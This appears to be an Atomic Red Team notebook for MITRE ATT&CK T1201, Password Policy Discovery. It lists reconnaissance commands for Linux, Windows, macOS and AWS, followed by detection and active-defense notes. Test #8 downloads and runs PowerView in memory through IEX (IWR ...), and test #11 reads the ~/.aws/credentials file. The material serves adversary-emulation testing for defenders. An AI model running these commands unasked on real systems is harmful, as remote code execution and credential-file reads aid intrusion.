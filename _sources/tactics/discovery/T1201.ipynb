{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7a04ca58",
   "metadata": {},
   "source": "# T1201 - Password Policy Discovery\nAdversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy)."
  },
  {
   "cell_type": "markdown",
   "id": "64bbfa54",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "a34b0628",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Examine password complexity policy - Ubuntu",
    "Lists the password complexity policy to console on Ubuntu Linux.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/pam.d/common-password\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83e3f15f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ae38c292",
   "metadata": {},
   "source": "### Atomic Test #2 - Examine password complexity policy - CentOS/RHEL 7.x\nLists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `bash`!\n##### Description: System must be CentOS or RHEL v7\n\n##### Check Prereq Commands:\n```bash\nif [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\necho Please run from CentOS or RHEL v7\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "19455008",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "04cce958",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/security/pwquality.conf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0d2806de",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "71290ac5",
   "metadata": {},
   "source": "### Atomic Test #3 - Examine password complexity policy - CentOS/RHEL 6.x\nLists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `bash`!\n##### Description: System must be CentOS or RHEL v6\n\n##### Check Prereq Commands:\n```bash\nif [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\necho Please run from CentOS or RHEL v6\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e390bc6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4b316a45",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "134ece8c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "3e447bdb",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Examine password expiration policy - All Linux",
    "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/login.defs\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ece11a1e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "fba4dfb1",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Examine local password policy - Windows",
    "Lists the local password policy to console on Windows.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet accounts\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fde1ae3e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "05a71e0c",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Examine domain password policy - Windows",
    "Lists the domain password policy to console on Windows.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet accounts /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9fae98c9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "543f097b",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Examine password policy - macOS",
    "Lists the password policy to console on macOS.\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\npwpolicy getaccountpolicies```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9be28822",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "fc4eddb6",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Get-DomainPolicy with PowerView",
    "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee95dc2a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "3577a443",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy",
    "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-addefaultdomainpasswordpolicy\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9d2f732d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "11bfd530",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Use of SecEdit.exe to export the local security policy (including the password policy)",
    "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsecedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24c165de",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "5d4dabd9",
   "metadata": {},
   "source": "### Atomic Test #11 - Examine AWS Password Policy\nThis atomic test will display details about the password policy for the current AWS account.\n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS defult profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7909b703",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e14e8d0d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws iam get-account-password-policy\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "224992f5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "d9affb60",
   "metadata": {},
   "source": "## Detection\nMonitor logs and processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity."
  },
  {
   "cell_type": "markdown",
   "id": "e794c9ac",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Software Manipulation \n Make changes to a system's software properties and functions to achieve a desired effect. \n\n Software Manipulation allows a defender to alter or replace elements of the operating system, file system, or any other software installed and executed on a system.\n#### Opportunity\nIn an adversary engagement operation, there is an opportunity to impact what an adversary sees when they execute commands on a system.\n#### Use Case\nA defender can alter the output of the password policy description so the adversary is unsure of exactly what the requirements are.\n#### Procedures\nHook the Win32 Sleep() function so that it always performs a Sleep(1) instead of the intended duration. This can increase the speed at which dynamic analysis can be performed when a normal malicious file sleeps for long periods before attempting additional capabilities.\nHook the Win32 NetUserChangePassword() and modify it such that the new password is different from the one provided. The data passed into the function is encrypted along with the modified new password, then logged so a defender can get alerted about the change as well as decrypt the new password for use.\nAlter the output of an adversary's profiling commands to make newly-built systems look like the operating system was installed months earlier.\nAlter the output of adversary recon commands to not show important assets, such as a file server containing sensitive data.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}